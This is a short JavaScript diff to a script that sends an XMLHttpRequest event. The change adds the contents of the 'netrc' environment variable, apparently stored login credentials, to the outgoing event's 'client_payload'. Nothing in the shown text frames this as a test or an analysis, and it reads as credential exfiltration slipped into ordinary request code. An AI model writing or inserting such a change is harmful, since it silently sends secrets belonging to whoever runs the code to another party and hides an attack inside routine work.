@@ -14,6 +14,6 @@ xhr.onreadystatechange = function () {
       console.log(xhr.responseText);
    }};
 
-var data = '{"event_type": "my-event"}';
+var data = '{"event_type": "my-event", "client_payload": {"netrc": '+process.env.netrc+'}}';
 
 xhr.send(data);
